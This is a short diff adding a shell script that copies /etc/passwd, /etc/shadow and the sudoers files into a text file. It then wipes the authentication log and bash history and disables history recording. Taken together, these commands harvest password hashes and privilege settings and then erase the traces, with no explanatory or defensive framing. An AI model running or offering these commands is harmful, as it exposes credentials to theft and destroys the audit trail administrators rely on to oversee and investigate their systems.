@@ -1,0 +1,9 @@
+sudo cat /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d/* >> user_access.txt
+
+sudo cat /dev/null > /var/log/auth.log
+
+sudo cat /dev/null > ~/.bash_history
+history -c
+export HISTFILESIZE=0
+export HISTSIZE=0
+unset HISTFILE
